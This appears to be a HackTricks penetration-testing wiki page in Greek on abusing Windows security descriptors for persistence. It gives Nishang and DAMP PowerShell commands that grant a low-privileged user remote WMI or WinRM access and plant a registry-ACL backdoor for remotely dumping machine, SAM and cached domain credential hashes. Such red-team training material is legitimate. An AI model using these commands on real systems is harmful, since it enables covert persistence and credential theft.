# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Οι Windows security descriptors περιέχουν ένα owner SID, ένα primary-group SID, ένα discretionary ACL (DACL) που ελέγχει την πρόσβαση και ένα system ACL (SACL) που χρησιμοποιείται κυρίως για auditing. Η Security Descriptor Definition Language (SDDL) είναι η textual αναπαράσταση· ένα ACE string έχει τη μορφή `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Ένα security descriptor αποθηκεύει ποιος είναι ο owner ενός securable object και ποιοι principals επιτρέπεται ή απαγορεύεται να έχουν συγκεκριμένα rights σε αυτό. Αν ένας attacker μπορεί να αλλάξει ένα DACL, μπορεί να παραχωρήσει σε έναν low-privileged principal rights που κανονικά απαιτούν administrative role.

Αυτό καθιστά τα narrowly modified descriptors χρήσιμα για persistence: το account παραμένει εκτός προφανών privileged groups, διατηρώντας παράλληλα access σε ένα συγκεκριμένο management surface. Αποθηκεύστε το original descriptor πριν από το testing, ώστε η αλλαγή να μπορεί να αφαιρεθεί με ακρίβεια.

### Access to WMI

Μπορείτε να δώσετε σε έναν user access για **execute remotely WMI** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Πρόσβαση στο WinRM

Παραχωρήστε σε έναν χρήστη πρόσβαση σε ένα απομακρυσμένο endpoint PowerShell/WinRM με τη συνάρτηση `Set-RemotePSRemoting` του Nishang:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Απομακρυσμένη πρόσβαση σε hashes

Το DAMP μπορεί να δημιουργήσει ένα registry-ACL backdoor που επιτρέπει αργότερα την απομακρυσμένη ανάκτηση του machine-account hash, των local SAM hashes και των cached domain credentials. Η εκχώρηση αυτών των περιορισμένων δικαιωμάτων σε έναν κατά τα άλλα συνηθισμένο λογαριασμό—ιδίως έναντι ενός domain controller—παρέχει ισχυρή persistence χωρίς συμμετοχή σε privileged group.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Δείτε τα [**Silver Tickets**](silver-ticket.md) για να μάθετε πώς θα μπορούσατε να χρησιμοποιήσετε το hash του computer account ενός Domain Controller.

## References

- [1] [Γλώσσα ορισμού Security Descriptor - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Έργο τροποποίησης Discretionary ACL](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Μορφή συμβολοσειράς Security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
